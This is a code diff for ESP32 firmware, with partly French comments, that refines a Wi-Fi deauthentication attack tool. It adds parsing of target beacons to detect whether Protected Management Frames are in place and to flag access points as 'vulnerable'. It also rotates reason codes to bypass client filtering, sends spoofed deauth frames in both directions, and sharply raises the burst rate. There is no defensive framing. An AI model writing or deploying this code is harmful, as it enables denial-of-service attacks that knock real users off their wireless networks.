@@ -24,6 +24,93 @@ static void IRAM_ATTR wifi_sniffer_packet_handler(void *buf, wifi_promiscuous_pk
     if (pkt->rx_ctrl.channel != attack_channel) return;
     
     switch (frame_type) {
+        // Dans le sniffer, analyser les beacon frames
+        // Frame type 0x80 = Beacon
+        case 0x80: { // Beacon frame
+            // Vérifier que c'est bien l'AP cible
+            const uint8_t *target_ap = deauth_get_ap_target();
+            if (memcmp(&frame[10], target_ap, 6) != 0) break;
+
+            // Compter les beacons pour confirmer que l'AP est à portée
+            effectiveness_stats.beacon_baseline++;
+
+            if (effectiveness_stats.pmf_checked) break;
+
+            // Les fixed fields d'un beacon font 12 bytes (header 802.11)
+            // + 8 bytes timestamp + 2 bytes interval + 2 bytes capabilities
+            // = on commence à chercher les IEs à l'offset 36
+            const uint8_t *ie = &frame[36];
+            int remaining = pkt->rx_ctrl.sig_len - 36;
+
+            while (remaining > 2) {
+                uint8_t tag_id  = ie[0];
+                uint8_t tag_len = ie[1];
+
+                if (tag_id == 0x30 && tag_len >= 4) { // RSN IE
+                    // RSN IE structure :
+                    // 2 bytes version
+                    // 4 bytes Group Cipher Suite
+                    // 2 bytes Pairwise Cipher Suite Count
+                    // N bytes Pairwise Cipher Suites
+                    // 2 bytes AKM Suite Count
+                    // N bytes AKM Suites
+                    // 2 bytes RSN Capabilities  <-- c'est là qu'on veut
+
+                    // Parser dynamiquement pour trouver RSN Capabilities
+                    const uint8_t *rsn = &ie[2];
+                    int rsn_remaining = tag_len;
+
+                    rsn += 2; rsn_remaining -= 2; // skip version
+                    if (rsn_remaining < 4) break;
+                    rsn += 4; rsn_remaining -= 4; // skip Group Cipher Suite
+
+                    if (rsn_remaining < 2) break;
+                    uint16_t pairwise_count = rsn[0] | (rsn[1] << 8);
+                    rsn += 2; rsn_remaining -= 2;
+
+                    uint16_t skip = pairwise_count * 4;
+                    if (rsn_remaining < skip + 2) break;
+                    rsn += skip; rsn_remaining -= skip; // skip Pairwise Cipher Suites
+
+                    uint16_t akm_count = rsn[0] | (rsn[1] << 8);
+                    rsn += 2; rsn_remaining -= 2;
+
+                    skip = akm_count * 4;
+                    if (rsn_remaining < skip + 2) break;
+                    rsn += skip; rsn_remaining -= skip; // skip AKM Suites
+
+                    // RSN Capabilities
+                    uint16_t rsn_caps = rsn[0] | (rsn[1] << 8);
+                    uint8_t mfpc = (rsn_caps >> 7) & 1; // bit 7 = MFPC
+                    uint8_t mfpr = (rsn_caps >> 6) & 1; // bit 6 = MFPR
+
+                    effectiveness_stats.pmf_capable  = mfpc;
+                    effectiveness_stats.pmf_required = mfpr;
+
+                    char pmf_status[128];
+                    if (mfpr) {
+                        snprintf(pmf_status, sizeof(pmf_status),
+                            "LOG|DEAUTH|msg=PMF=REQUIRED - target immune to deauth");
+                        ESP_LOGW(TAG, "AP PMF REQUIRED - deauth will be ignored");
+                    } else if (mfpc) {
+                        snprintf(pmf_status, sizeof(pmf_status),
+                            "LOG|DEAUTH|msg=PMF=OPTIONAL - deauth may work");
+                        ESP_LOGW(TAG, "AP PMF OPTIONAL");
+                    } else {
+                        snprintf(pmf_status, sizeof(pmf_status),
+                            "LOG|DEAUTH|msg=PMF=NONE - target vulnerable");
+                        ESP_LOGI(TAG, "AP no PMF - vulnerable");
+                    }
+                    effectiveness_stats.pmf_checked = true;
+                    BleManager_SendStatus(pmf_status);
+                    break;
+                }
+
+                ie        += 2 + tag_len;
+                remaining -= 2 + tag_len;
+            }
+            break;
+        }
         case 0xB0: // Authentication frame
             if (monitoring_phase == 0) {
                 effectiveness_stats.auth_baseline++;
@@ -165,6 +252,20 @@ static void deauth_with_test_task(void *vParameters) {
     stop_monitoring();
     
     ESP_LOGI(TAG, "Baseline: %lu auth frames detected", effectiveness_stats.auth_baseline);
+
+    // Check if AP is in range
+    if (effectiveness_stats.beacon_baseline == 0) {
+        BleManager_SendStatus("LOG|DEAUTH|msg=ERROR - AP not in range, aborting");
+        ESP_LOGE(TAG, "AP not detected in baseline - out of range or wrong channel");
+        goto cleanup;
+    }
+
+    // Check PMF
+    if (effectiveness_stats.pmf_required) {
+        BleManager_SendStatus("LOG|DEAUTH|msg=ERROR - PMF required, target immune");
+        ESP_LOGE(TAG, "PMF required - attack will fail");
+        goto cleanup;  // Inutile d'attaquer
+    }
     
     // PHASE 2: Attack
     ESP_LOGI(TAG, "Phase 2: Deauth attack (3s)...");
@@ -179,9 +280,9 @@ static void deauth_with_test_task(void *vParameters) {
     ESP_LOGI(TAG, "Phase 3: Post-attack monitoring (5s)...");
     BleManager_SendStatus("LOG|DEAUTH|msg=Phase 3: Monitoring responses...");
     monitoring_phase = 2;
-    vTaskDelay(pdMS_TO_TICKS(500)); // laps before monitoring
+    vTaskDelay(pdMS_TO_TICKS(100)); // laps before monitoring
     start_monitoring();
-    vTaskDelay(pdMS_TO_TICKS(8000));
+    vTaskDelay(pdMS_TO_TICKS(10000));
     stop_monitoring();
     
     ESP_LOGI(TAG, "Post-attack: %lu auth, %lu reassoc, %lu probe req", 
@@ -192,12 +293,12 @@ static void deauth_with_test_task(void *vParameters) {
     // PHASE 4: Analysis
     analyze_effectiveness();
 
+cleanup:
     snifferActive = false;
     deauthActive = false;
     isAttackActive = false;
     
     // Cleanup
-    isAttackActive = false;
     deauth_set_task_handle(NULL);
     vTaskDelete(NULL);
 }
@@ -222,64 +323,33 @@ void send_deauth_packets_timed(const uint8_t *ap_mac, const uint8_t *client_mac,
 
     // Variables for deauth attack
     uint8_t packet[26];
-    esp_err_t ret;
     int total_count = 0;
     int success_count = 0;
-    int retry_count = 0;
     const int MAX_RETRIES = 3;
+
+    // Bypass client filtering with different Reason codes
+    const uint8_t reason_codes[] = { 0x01, 0x03, 0x07, 0x08 };
+    const int reason_count = sizeof(reason_codes);
     
     // Boucle limitée dans le temps
     while (deauthActive && elapsed < duration_ms) {
         // Send burst of 3 packets with retries on failure
         for (int burst = 0; burst < 3; burst++) {
-            // ===== AP -> Client deauth =====
-            memcpy(packet, deauth_frame, sizeof(deauth_frame));
-            memcpy(&packet[4], client_mac, 6); // Destination: CLIENT
-            memcpy(&packet[10], ap_mac, 6); // Source: AP
-            memcpy(&packet[16], ap_mac, 6); // BSSID: AP
-            
-            retry_count = 0;
-            do {
-                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-                if (ret == ESP_OK) {
-                    success_count++;
-                    break;
-                } else if (ret == ESP_ERR_NO_MEM) {
-                    vTaskDelay(pdMS_TO_TICKS(50));
-                    retry_count++;
-                } else {
-                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
-                    break;
-                }
-            } while (retry_count < MAX_RETRIES);
-            
-            vTaskDelay(pdMS_TO_TICKS(10));
-            
-            // ===== Client -> AP deauth =====
-            memcpy(&packet[4], ap_mac, 6); // Destination: AP
-            memcpy(&packet[10], client_mac, 6); // Source: CLIENT
-            memcpy(&packet[16], ap_mac, 6); // BSSID: AP
-            
-            retry_count = 0;
-            do {
-                ret = esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
-                if (ret == ESP_OK) {
-                    success_count++;
-                    break;
-                } else if (ret == ESP_ERR_NO_MEM) {
-                    vTaskDelay(pdMS_TO_TICKS(50));
-                    retry_count++;
-                } else {
-                    ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(ret));
-                    break;
-                }
-            } while (retry_count < MAX_RETRIES);
-            
-            vTaskDelay(pdMS_TO_TICKS(10));
+            uint8_t reason = reason_codes[(total_count + burst) % reason_count];
+
+            // ===== AP -> Client =====
+            build_deauth_packet(packet, client_mac, ap_mac, ap_mac, reason);
+            if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
+            vTaskDelay(pdMS_TO_TICKS(5));
+
+            // ===== Client -> AP =====
+            build_deauth_packet(packet, ap_mac, client_mac, ap_mac, reason);
+            if (send_with_retry(packet, MAX_RETRIES) == ESP_OK) success_count++;
+            vTaskDelay(pdMS_TO_TICKS(5));
         }
-        
-        // Longer delay between bursts
-        vTaskDelay(pdMS_TO_TICKS(500));
+
+        // Inter-burst
+        vTaskDelay(pdMS_TO_TICKS(50));
         
         // Update elapsed time
         elapsed = (esp_timer_get_time() / 1000) - start_time;
